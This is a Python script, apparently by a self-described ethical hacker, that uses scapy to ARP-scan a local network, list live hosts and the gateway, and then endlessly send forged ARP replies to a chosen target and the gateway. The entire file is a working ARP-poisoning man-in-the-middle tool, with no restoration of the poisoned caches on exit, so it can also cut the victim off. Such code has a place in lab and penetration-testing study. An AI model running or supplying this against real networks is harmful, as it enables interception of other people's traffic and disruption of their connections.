#!/usr/bin/env python3
'''
@auth: Huzefa Dayanji
@role: Ethical Hacker
@lang: Python3
@desc: Performs ARP Poisoning attack
@date: 20/12/2024
@size: 2,973 KB
'''
from prettytable import PrettyTable
from scapy.all import ARP, Ether, srp, conf, send
import socket

def scan_network(network_cidr):
    """
    Scans the network to find live hosts and their MAC addresses.
    """
    # Create an ARP request packet and broadcasts it
    arp = ARP(pdst=network_cidr)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    # Send the ARP request and capture responses
    result = srp(packet, timeout=5, verbose=False)[0]

    # Extract IP and MAC addresses of live hosts
    live_hosts = []
    for sent, received in result:
        live_hosts.append({"ip": received.psrc, "mac": received.hwsrc})

    return live_hosts

def get_gateway_info():
	"""
	Get the Info of the gateway such as IPv4 and MAC address
	"""

	# get the default gateway
	gateway_ip = conf.route.route("0.0.0.0")[2]

	# Sends an ARP request to gateway
	arp_req = ARP(pdst=gateway_ip)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_req
	ans = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

	# Extract gateway MAC address
	gateway_mac = ans[0][1].hwsrc if ans else "Unknown"

	return gateway_ip, gateway_mac

def get_hostname(ip):
    """
    Returns the hostname of the given IP address.
    """
    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except socket.herror:
        hostname = "Unknown"
    return hostname

def arp_spoof(target_ip, spoof_ip, target_mac):
        """ Here the ARP packet is set to response and
        pdst is set to the target IP
        either it is for victim or router and the hwds
        is the MAC address of the IP provided
        and the psrc is the spoofing ip address
        to manipulate the packet"""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

# Input: Network CIDR
network_cidr = input("Enter network CIDR (e.g., 192.168.1.0/24): ")

# Get live hosts
live_hosts = scan_network(network_cidr)

# Display results in a pretty table
if live_hosts:
	table = PrettyTable(["IP Address", "MAC Address", "Hostname"])
	targets = {}
	gateway_ip, gateway_mac = get_gateway_info()
	for host in live_hosts:
		targets[host["ip"]] = host["mac"]
		hostname = get_hostname(host["ip"])
		if host["ip"] == gateway_ip:
			table.add_row([gateway_ip + " (gateway)", gateway_mac, get_hostname(gateway_ip)])
		else:
      			table.add_row([host["ip"], host["mac"], hostname])

	print("\nLive Hosts in the Network:")
	print(table)
else:
	print("\nNo live hosts found in the network.")


print("", end="\n")
try:
	target_ip = input("Enter target IP : ")
	gateway_ip, gateway_mac = get_gateway_info()
	sent_packets_count = 0
	if target_ip in targets:
		while True:
			sent_packets_count += 2
			arp_spoof(target_ip, gateway_ip, targets[target_ip])
			arp_spoof(gateway_ip, target_ip, gateway_mac)
			print(f"[+] Packets sent : {sent_packets_count}", end="\r")
except KeyboardInterrupt:
	print("Program exited by user.", end="\n")
	exit(0)
